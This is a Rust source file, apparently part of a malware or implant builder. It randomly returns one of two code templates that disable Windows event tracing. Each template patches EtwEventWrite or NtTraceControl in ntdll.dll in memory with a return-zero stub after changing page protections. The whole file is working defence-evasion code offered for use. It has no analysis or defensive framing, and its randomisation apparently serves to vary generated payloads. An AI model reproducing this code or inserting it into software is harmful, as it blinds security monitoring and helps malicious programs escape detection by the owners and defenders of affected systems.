use rand::Rng;

pub fn select_etw_bypass(rng: &mut impl Rng) -> String {
    match rng.gen_range(0..2) {
        0 => etw_bypass_patch(),
        1 => etw_bypass_syscall_redirect(),
        _ => unreachable!(),
    }
}

fn etw_bypass_patch() -> String {
    r#"    // ETW bypass: EtwEventWrite return patching
    {
        use windows_sys::Win32::System::LibraryLoader::*;
        use windows_sys::Win32::System::Memory::*;
        use std::ffi::c_void;

        unsafe {
            let ntdll_name: Vec<u16> = "ntdll.dll".encode_utf16().chain(std::iter::once(0)).collect();
            let ntdll_mod = GetModuleHandleW(ntdll_name.as_ptr());
            if !ntdll_mod.is_null() {
                let proc_name = b"EtwEventWrite\0";
                if let Some(target_fn) = GetProcAddress(ntdll_mod, proc_name.as_ptr()) {
                    let target = target_fn as *mut u8;

                    let mut original_bytes: [u8; 4] = [0; 4];
                    std::ptr::copy_nonoverlapping(target, original_bytes.as_mut_ptr(), 4);

                    let backup = VirtualAlloc(
                        std::ptr::null(),
                        64,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE,
                    );
                    if !backup.is_null() {
                        std::ptr::copy_nonoverlapping(
                            original_bytes.as_ptr(),
                            backup as *mut u8,
                            original_bytes.len(),
                        );
                    }

                    let patch: [u8; 4] = [0x48, 0x33, 0xC0, 0xC3];

                    let mut old_protect = 0u32;
                    VirtualProtect(
                        target as *const c_void,
                        patch.len(),
                        PAGE_EXECUTE_READWRITE,
                        &mut old_protect,
                    );

                    std::ptr::copy_nonoverlapping(
                        patch.as_ptr(),
                        target,
                        patch.len(),
                    );

                    let mut tmp = 0u32;
                    VirtualProtect(
                        target as *const c_void,
                        patch.len(),
                        old_protect,
                        &mut tmp,
                    );
                }
            }
        }
    }"#
    .to_string()
}

fn etw_bypass_syscall_redirect() -> String {
    r#"    // ETW bypass: NtTraceControl patch
    {
        use windows_sys::Win32::System::LibraryLoader::*;
        use windows_sys::Win32::System::Memory::*;
        use std::ffi::c_void;

        unsafe {
            let ntdll_name: Vec<u16> = "ntdll.dll".encode_utf16().chain(std::iter::once(0)).collect();
            let ntdll_mod = GetModuleHandleW(ntdll_name.as_ptr());
            if !ntdll_mod.is_null() {
                let proc_name = b"NtTraceControl\0";
                if let Some(target_fn) = GetProcAddress(ntdll_mod, proc_name.as_ptr()) {
                    let target = target_fn as *mut u8;

                    let potential_syscall = std::ptr::read_unaligned(target.add(4) as *const u32);

                    let stub: [u8; 4] = [0x48, 0x33, 0xC0, 0xC3];

                    let mut old_protect = 0u32;
                    VirtualProtect(
                        target as *const c_void,
                        stub.len(),
                        PAGE_EXECUTE_READWRITE,
                        &mut old_protect,
                    );

                    std::ptr::copy_nonoverlapping(
                        stub.as_ptr(),
                        target,
                        stub.len(),
                    );

                    let mut tmp = 0u32;
                    VirtualProtect(
                        target as *const c_void,
                        stub.len(),
                        old_protect,
                        &mut tmp,
                    );

                    std::hint::black_box(potential_syscall);
                }
            }
        }
    }"#
    .to_string()
}
